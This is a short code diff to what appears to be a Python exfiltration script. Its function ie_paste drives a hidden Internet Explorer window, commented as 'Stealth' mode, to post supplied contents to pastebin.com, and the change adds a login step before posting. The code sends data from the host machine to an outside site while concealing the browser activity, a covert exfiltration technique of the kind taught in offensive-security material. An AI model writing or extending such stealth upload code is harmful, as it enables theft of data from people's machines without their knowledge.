@@ -89,7 +89,11 @@ def ie_paste(title, contents):
     # Do you want the process to be visible? Debugging = 1, Stealth = 0
     ie.Visible = 0
 
-    ie.Navigate('https://pastebin.com/', Headers=header)
+    ie.Navigate('https://pastebin.com/login', Headers=header)
+    wait_for_browser(ie)
+    login(ie)
+
+    ie.Navigate('https://pastebin.com/')
     wait_for_browser(ie)
     submit(ie, title, contents.decode())
 
